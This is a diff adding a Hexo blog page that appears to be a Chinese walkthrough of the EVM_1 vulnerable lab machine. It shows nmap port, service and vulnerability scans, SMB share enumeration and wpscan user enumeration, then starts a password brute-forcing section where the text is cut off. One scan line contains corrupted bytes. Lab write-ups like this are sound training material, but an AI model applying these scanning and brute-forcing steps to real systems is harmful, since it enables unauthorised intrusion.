@@ -1,0 +1,715 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="I3eg1nner">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="EVM_1 靶机信息收集1234567891011121314151617┌──(kali㉿kali)-[~]└─$ sudo nmap --min-rate 10000 -p- 192.168.56.103   Starting Nmap 7.94 ( https:&#x2F;&#x2F;nmap.org ) at 2023-06-27 04:08 EDTNmap scan report for 192.168.5">
+<meta property="og:type" content="article">
+<meta property="og:title" content="EVM_1 靶机">
+<meta property="og:url" content="https://i3eg1nner.github.io/2023/06/0c6297e238cc.html">
+<meta property="og:site_name" content="I3eg1nner&#39;s blog">
+<meta property="og:description" content="EVM_1 靶机信息收集1234567891011121314151617┌──(kali㉿kali)-[~]└─$ sudo nmap --min-rate 10000 -p- 192.168.56.103   Starting Nmap 7.94 ( https:&#x2F;&#x2F;nmap.org ) at 2023-06-27 04:08 EDTNmap scan report for 192.168.5">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://i3eg1nner.github.io/pic/a690a0c8530ecdfd48e44638b306d530_MD5.png">
+<meta property="og:image" content="https://i3eg1nner.github.io/pic/4d9c9b99fff041ffa31c0e161ef7f8bf_MD5.png">
+<meta property="article:published_time" content="2023-06-27T09:11:12.000Z">
+<meta property="article:modified_time" content="2023-06-27T14:07:04.323Z">
+<meta property="article:author" content="I3eg1nner">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://i3eg1nner.github.io/pic/a690a0c8530ecdfd48e44638b306d530_MD5.png">
+  
+  
+  
+  <title>EVM_1 靶机 - I3eg1nner&#39;s blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"i3eg1nner.github.io","root":"/","version":"1.9.4","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>I3eg1nner</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="EVM_1 靶机"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2023-06-27 17:11" pubdate>
+          2023年6月27日 下午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          26k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          216 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">EVM_1 靶机</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="EVM-1-靶机"><a href="#EVM-1-靶机" class="headerlink" title="EVM_1 靶机"></a>EVM_1 靶机</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~]<br>└─$ sudo nmap --min-rate 10000 -p- 192.168.56.103   <br>Starting Nmap 7.94 ( https://nmap.org ) at 2023-06-27 04:08 EDT<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.56.103<br>Host is up (0.000073s latency).<br>Not shown: 65528 closed tcp ports (reset)<br>PORT    STATE SERVICE<br>22/tcp  open  ssh<br>53/tcp  open  domain<br>80/tcp  open  http<br>110/tcp open  pop3<br>139/tcp open  netbios-ssn<br>143/tcp open  imap<br>445/tcp open  microsoft-ds<br>MAC Address: 08:00:27:06:73:F2 (Oracle VirtualBox virtual NIC)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 2.41 seconds<br></code></pre></td></tr></table></figure>
+
+<p>开启了22,53,80,110,139,143,445 端口</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~]<br>└─$ sudo nmap -sT -sV -sC -O -p22,53,80,110,139,143,445 192.168.56.103<br>Starting Nmap 7.94 ( https://nmap.org ) at 2023-06-27 04:08 EDT<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.56.103<br>Host is up (0.00031s latency).<br><br>PORT    STATE SERVICE     VERSION<br>22/tcp  open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)<br>| ssh-hostkey: <br>|   2048 a2:d3:34:13:62:b1:18:a3:<span class="hljs-built_in">dd</span>:db:35:c5:5a:b7:c0:78 (RSA)<br>|   256 85:48:53:2a:50:c5:a0:b7:1a:ee:a4:d8:12:8e:1c:ce (ECDSA)<br>|_  256 36:22:92:c7:32:22:e3:34:51:bc:0e:74:9f:1c:db:aa (ED25519)<br>53/tcp  open  domain      ISC BIND 9.10.3-P4 (Ubuntu Linux)<br>| dns-nsid: <br>|_  bind.version: 9.10.3-P4-Ubuntu<br>80/tcp  open  http        Apache httpd 2.4.18 ((Ubuntu))<br>|_http-title: Apache2 Ubuntu Default Page: It works<br>|_http-server-header: Apache/2.4.18 (Ubuntu)<br>110/tcp open  pop3        Dovecot pop3d<br>|_pop3-capabilities: CAPA TOP RESP-CODES SASL AUTH-RESP-CODE UIDL PIPELINING<br>139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)<br>143/tcp open  imap        Dovecot imapd<br>|_imap-capabilities: ENABLE have ID LOGINDISABLEDA0001 more post-login IMAP4rev1 IDLE listed capabilities SASL-IR OK Pre-login LOGIN-REFERRALS LITERAL+<br>445/tcp open  `�J�V      Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)<br>MAC Address: 08:00:27:06:73:F2 (Oracle VirtualBox virtual NIC)<br>Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port<br>Device <span class="hljs-built_in">type</span>: general purpose<br>Running: Linux 3.X|4.X<br>OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4<br>OS details: Linux 3.2 - 4.9<br>Network Distance: 1 hop<br>Service Info: Host: UBUNTU-EXTERMELY-VULNERABLE-M4CH1INE; OS: Linux; CPE: cpe:/o:linux:linux_kernel<br><br>Host script results:<br>|_nbstat: NetBIOS name: UBUNTU-EXTERMEL, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)<br>| smb2-security-mode: <br>|   3:1:1: <br>|_    Message signing enabled but not required<br>| smb-security-mode: <br>|   account_used: guest<br>|   authentication_level: user<br>|   challenge_response: supported<br>|_  message_signing: disabled (dangerous, but default)<br>| smb2-time: <br>|   <span class="hljs-built_in">date</span>: 2023-06-27T08:09:05<br>|_  start_date: N/A<br>| smb-os-discovery: <br>|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)<br>|   Computer name: ubuntu-extermely-vulnerable-m4ch1ine<br>|   NetBIOS computer name: UBUNTU-EXTERMELY-VULNERABLE-M4CH1INE\x00<br>|   Domain name: \x00<br>|   FQDN: ubuntu-extermely-vulnerable-m4ch1ine<br>|_  System time: 2023-06-27T04:09:05-04:00<br>|_clock-skew: mean: 1h19m57s, deviation: 2h18m33s, median: -2s<br><br>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 20.99 seconds<br></code></pre></td></tr></table></figure>
+
+<p>Ubuntu 操作系统</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~]<br>└─$ sudo nmap --script=vuln -p22,53,80,110,139,143,445 192.168.56.103 <br>Starting Nmap 7.94 ( https://nmap.org ) at 2023-06-27 04:09 EDT<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.56.103<br>Host is up (0.00024s latency).<br><br>PORT    STATE SERVICE<br>22/tcp  open  ssh<br>53/tcp  open  domain<br>80/tcp  open  http<br>|_http-dombased-xss: Couldn\<span class="hljs-string">&#x27;t find any DOM based XSS.</span><br><span class="hljs-string">| http-enum: </span><br><span class="hljs-string">|   /wordpress/: Blog</span><br><span class="hljs-string">|   /info.php: Possible information file</span><br><span class="hljs-string">|_  /wordpress/wp-login.php: Wordpress login page.</span><br><span class="hljs-string">|_http-csrf: Couldn\&#x27;</span>t find any CSRF vulnerabilities.<br>|_http-stored-xss: Couldn\<span class="hljs-string">&#x27;t find any stored XSS vulnerabilities.</span><br><span class="hljs-string">| http-slowloris-check: </span><br><span class="hljs-string">|   VULNERABLE:</span><br><span class="hljs-string">|   Slowloris DOS attack</span><br><span class="hljs-string">|     State: LIKELY VULNERABLE</span><br><span class="hljs-string">|     IDs:  CVE:CVE-2007-6750</span><br><span class="hljs-string">|       Slowloris tries to keep many connections to the target web server open and hold</span><br><span class="hljs-string">|       them open as long as possible.  It accomplishes this by opening connections to</span><br><span class="hljs-string">|       the target web server and sending a partial request. By doing so, it starves</span><br><span class="hljs-string">|       the http server\&#x27;</span>s resources causing Denial Of Service.<br>|       <br>|     Disclosure <span class="hljs-built_in">date</span>: 2009-09-17<br>|     References:<br>|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750<br>|_      http://ha.ckers.org/slowloris/<br>110/tcp open  pop3<br>139/tcp open  netbios-ssn<br>143/tcp open  imap<br>445/tcp open  microsoft-ds<br>MAC Address: 08:00:27:06:73:F2 (Oracle VirtualBox virtual NIC)<br><br>Host script results:<br>|_smb-vuln-ms10-061: <span class="hljs-literal">false</span><br>| smb-vuln-regsvc-dos: <br>|   VULNERABLE:<br>|   Service regsvc <span class="hljs-keyword">in</span> Microsoft Windows systems vulnerable to denial of service<br>|     State: VULNERABLE<br>|       The service regsvc <span class="hljs-keyword">in</span> Microsoft Windows 2000 systems is vulnerable to denial of service caused by a null deference<br>|       pointer. This script will crash the service <span class="hljs-keyword">if</span> it is vulnerable. This vulnerability was discovered by Ron Bowes<br>|       <span class="hljs-keyword">while</span> working on smb-enum-sessions.<br>|_          <br>|_smb-vuln-ms10-054: <span class="hljs-literal">false</span><br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 321.68 seconds<br><br></code></pre></td></tr></table></figure>
+
+<p>漏洞脚本扫描得到了 wordpress 目录和 info.php，先尝试 smb 脚本扫描</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~]<br>└─$ sudo nmap --script=smb-enum-shares.nse,smb-enum-users.nse  192.168.56.103 <br>Starting Nmap 7.94 ( https://nmap.org ) at 2023-06-27 04:25 EDT<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.56.103<br>Host is up (0.000092s latency).<br>Not shown: 993 closed tcp ports (reset)<br>PORT    STATE SERVICE<br>22/tcp  open  ssh<br>53/tcp  open  domain<br>80/tcp  open  http<br>110/tcp open  pop3<br>139/tcp open  netbios-ssn<br>143/tcp open  imap<br>445/tcp open  microsoft-ds<br>MAC Address: 08:00:27:06:73:F2 (Oracle VirtualBox virtual NIC)<br><br>Host script results:<br>| smb-enum-shares: <br>|   account_used: guest<br>|   \\192.168.56.103\IPC$: <br>|     Type: STYPE_IPC_HIDDEN<br>|     Comment: IPC Service (ubuntu-extermely-vulnerable-m4ch1ine server (Samba, Ubuntu))<br>|     Users: 2<br>|     Max Users: &lt;unlimited&gt;<br>|     Path: C:\tmp<br>|     Anonymous access: READ/WRITE<br>|     Current user access: READ/WRITE<br>|   \\192.168.56.103\<span class="hljs-built_in">print</span>$: <br>|     Type: STYPE_DISKTREE<br>|     Comment: Printer Drivers<br>|     Users: 0<br>|     Max Users: &lt;unlimited&gt;<br>|     Path: C:\var\lib\samba\printers<br>|     Anonymous access: &lt;none&gt;<br>|_    Current user access: &lt;none&gt;<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 0.47 seconds<br></code></pre></td></tr></table></figure>
+
+<h2 id="Wordpress-渗透"><a href="#Wordpress-渗透" class="headerlink" title="Wordpress 渗透"></a>Wordpress 渗透</h2><h3 id="wpscan-扫描"><a href="#wpscan-扫描" class="headerlink" title="wpscan 扫描"></a>wpscan 扫描</h3><p>看来 smb 突破点较少，那就将关注点放在 wordpress，使用 wpscan 来进行信息收集</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Desktop/Clash <span class="hljs-keyword">for</span> Windows-0.19.26-x64-linux]<br>└─$ wpscan --url http://192.168.56.103/wordpress --enumerate u       <br>Type application/netcdf is already registered as a variant of application/netcdf.<br>_______________________________________________________________<br>         __          _______   _____<br>         \ \        / /  __ \ / ____|<br>          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®<br>           \ \/  \/ / |  ___/ \___ \ / __|/ _` |  _ \<br>            \  /\  /  | |     ____) | (__| (_| | | | |<br>             \/  \/   |_|    |_____/ \___|\__,_|_| |_|<br><br>         WordPress Security Scanner by the WPScan Team<br>                         Version 3.8.24<br>       Sponsored by Automattic - https://automattic.com/<br>       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart<br>_______________________________________________________________<br><br>[i] It seems like you have not updated the database <span class="hljs-keyword">for</span> some time.<br>[?] Do you want to update now? [Y]es [N]o, default: [N]n<br>[+] URL: http://192.168.56.103/wordpress/ [192.168.56.103]<br>[+] Started: Tue Jun 27 04:31:05 2023<br><br>Interesting Finding(s):<br><br>[+] Headers<br> | Interesting Entry: Server: Apache/2.4.18 (Ubuntu)<br> | Found By: Headers (Passive Detection)<br> | Confidence: 100%<br><br>[+] XML-RPC seems to be enabled: http://192.168.56.103/wordpress/xmlrpc.php<br> | Found By: Direct Access (Aggressive Detection)<br> | Confidence: 100%<br> | References:<br> |  - http://codex.wordpress.org/XML-RPC_Pingback_API<br> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/<br> |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/<br> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/<br> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/<br><br>[+] WordPress readme found: http://192.168.56.103/wordpress/readme.html<br> | Found By: Direct Access (Aggressive Detection)<br> | Confidence: 100%<br><br>[+] Upload directory has listing enabled: http://192.168.56.103/wordpress/wp-content/uploads/<br> | Found By: Direct Access (Aggressive Detection)<br> | Confidence: 100%<br><br>[+] The external WP-Cron seems to be enabled: http://192.168.56.103/wordpress/wp-cron.php<br> | Found By: Direct Access (Aggressive Detection)<br> | Confidence: 60%<br> | References:<br> |  - https://www.iplocation.net/defend-wordpress-from-ddos<br> |  - https://github.com/wpscanteam/wpscan/issues/1299<br><br>[+] WordPress version 5.2.4 identified (Insecure, released on 2019-10-14).<br> | Found By: Rss Generator (Passive Detection)<br> |  - http://192.168.56.103/wordpress/index.php/feed/, &lt;generator&gt;https://wordpress.org/?v=5.2.4&lt;/generator&gt;<br> |  - http://192.168.56.103/wordpress/index.php/comments/feed/, &lt;generator&gt;https://wordpress.org/?v=5.2.4&lt;/generator&gt;<br><br>[+] WordPress theme <span class="hljs-keyword">in</span> use: twentynineteen<br> | Location: http://192.168.56.103/wordpress/wp-content/themes/twentynineteen/<br> | Last Updated: 2023-03-29T00:00:00.000Z<br> | Readme: http://192.168.56.103/wordpress/wp-content/themes/twentynineteen/readme.txt<br> | [!] The version is out of <span class="hljs-built_in">date</span>, the latest version is 2.5<br> | Style URL: http://192.168.56.103/wordpress/wp-content/themes/twentynineteen/style.css?ver=1.4<br> | Style Name: Twenty Nineteen<br> | Style URI: https://wordpress.org/themes/twentynineteen/<br> | Description: Our 2019 default theme is designed to show off the power of the block editor. It features custom sty...<br> | Author: the WordPress team<br> | Author URI: https://wordpress.org/<br> |<br> | Found By: Css Style In Homepage (Passive Detection)<br> |<br> | Version: 1.4 (80% confidence)<br> | Found By: Style (Passive Detection)<br> |  - http://192.168.56.103/wordpress/wp-content/themes/twentynineteen/style.css?ver=1.4, Match: <span class="hljs-string">&#x27;Version: 1.4&#x27;</span><br><br>[+] Enumerating Users (via Passive and Aggressive Methods)<br> Brute Forcing Author IDs - Time: 00:00:00 &lt;======================================&gt; (10 / 10) 100.00% Time: 00:00:00<br><br>[i] User(s) Identified:<br><br>[+] c0rrupt3d_brain<br> | Found By: Author Posts - Author Pattern (Passive Detection)<br> | Confirmed By:<br> |  Rss Generator (Passive Detection)<br> |  Wp Json Api (Aggressive Detection)<br> |   - http://192.168.56.103/wordpress/index.php/wp-json/wp/v2/users/?per_page=100&amp;page=1<br> |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)<br> |  Login Error Messages (Aggressive Detection)<br><br>[!] No WPScan API Token given, as a result vulnerability data has not been output.<br>[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register<br><br>[+] Finished: Tue Jun 27 04:31:08 2023<br>[+] Requests Done: 53<br>[+] Cached Requests: 6<br>[+] Data Sent: 14.439 KB<br>[+] Data Received: 522.866 KB<br>[+] Memory used: 188.668 MB<br>[+] Elapsed time: 00:00:02<br><br></code></pre></td></tr></table></figure>
+
+<h3 id="爆破密码"><a href="#爆破密码" class="headerlink" title="爆破密码"></a>爆破密码</h3><p>得到了一些目录和一个用户 <code>c0rrupt3d_brain</code>，感觉没什么可利用的插件漏洞，先爆破试试吧</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span 